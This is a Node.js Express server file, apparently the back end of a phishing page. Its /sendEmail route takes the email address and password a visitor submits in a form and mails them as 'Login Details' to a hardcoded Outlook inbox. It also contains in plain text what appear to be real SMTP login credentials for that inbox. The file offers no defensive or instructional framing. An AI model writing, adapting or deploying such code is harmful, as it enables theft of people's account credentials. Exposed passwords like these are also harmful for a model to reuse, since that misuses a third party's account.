const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');

const app = express();
const PORT = 5500;

// Body Parser Middleware
app.use(bodyParser.urlencoded({ extended: false }));

// Serve static files
app.use(express.static('public'));

// POST route to handle form submission
app.post('/sendEmail', (req, res) => {
    const { email, password } = req.body;

    // Nodemailer setup for Outlook
    let transporter = nodemailer.createTransport({
        host: 'smtp.office365.com',
        port: 587,
        secure: false,
        auth: {
            user: 'ayomidesamod04@outlook.com', // Replace with your Outlook email
            pass: '@_samod2005' // Replace with your Outlook app password
        }
    });

    let mailOptions = {
        from: 'ayomidesamod04@outlook.com', // Replace with your Outlook email
        to: 'ayomidesamod04@outlook.com', // Replace with your Outlook email
        subject: 'Login Details',
        text: `Client Email: ${email}\nClient Password: ${password}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.log('Error:', error.message);
            res.send('Failed to send email.');
        } else {
            console.log('Email sent: ' + info.response);
            res.send('Email sent successfully.');
        }
    });
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

app.use(express.static('public'));  

// Example route to serve script.js
app.get('/script.js', (req, res) => {
    res.sendFile(__dirname + '/public/js/script.js');
});

// Example route to serve client.js
app.get('/client.js', (req, res) => {
    res.sendFile(__dirname + '/public/js/client.js');
});

// ... Rest of your server code
// const express = require('express');

// Define a route for the root endpoint
app.get('/', (req, res) => {
    res.send('Hello World!');
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
